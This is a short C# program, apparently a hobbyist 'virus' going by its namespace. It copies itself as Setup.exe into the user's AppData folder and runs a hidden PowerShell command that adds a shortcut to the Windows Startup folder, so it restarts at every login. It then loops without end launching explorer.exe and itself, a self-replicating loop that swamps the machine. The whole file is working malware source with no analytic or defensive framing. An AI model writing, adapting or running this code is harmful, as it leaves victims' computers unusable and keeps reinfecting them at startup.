using System;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace C__Virus
{
    class Program
    {
        static void Main(string[] args)
        {

            try
            {


                string path = Directory.GetCurrentDirectory();
                string homedir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string fileName = "Setup.exe";
                string sourcePath = Directory.GetCurrentDirectory();
                string ExEPath2 = Path.Combine(homedir, "AppData\\Local");
                string targetPath = Path.Combine(homedir, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");


                if (Directory.GetCurrentDirectory() != targetPath)
                {
                    // Get the current directory.;
                    string target = @"c:\temp";
                    Console.WriteLine("The current directory is {0}", path);
                    if (!Directory.Exists(target))
                    {
                        Directory.CreateDirectory(target);
                    }

                    // Use Path class to manipulate file and directory paths.
                    string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
                    string destFile = System.IO.Path.Combine(targetPath, fileName);

                    if (System.IO.Directory.Exists(sourcePath))
                    {
                        // Copy the files and overwrite destination files if they already exist.
                        // Use static Path methods to extract only the file name from the path.
                        destFile = System.IO.Path.Combine(ExEPath2, fileName);
                        string sorcFile = System.IO.Path.Combine(sourcePath, fileName);
                        System.IO.File.Copy(sorcFile, destFile, true);

                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        string Command = $"$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('"+Path.Combine(targetPath, "Setup.lnk")+"');$Shortcut.TargetPath = '"+Path.Combine(ExEPath2, "Setup.exe")+"';$Shortcut.Save();exit;";
                        startInfo.FileName = "powershell.exe";
                        startInfo.Arguments = $"-Command \"{Command}\"";
                        process.StartInfo = startInfo;
                        process.Start();
                    }
                    else
                    {
                        Console.WriteLine("Source path does not exist!");
                    }

                }
                else
                {
                    while (true)
                    {
                        //Thread.Sleep(5000);
                        Process.Start("explorer.exe");
                        Process.Start(@"./Setup.exe");
                    }
                }

                while (true)
                {
                    //Thread.Sleep(5000);
                    Process.Start("explorer.exe");
                    Process.Start(@"./Setup.exe");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("The process failed: {0}", e.ToString());
            }
        }
    }
}

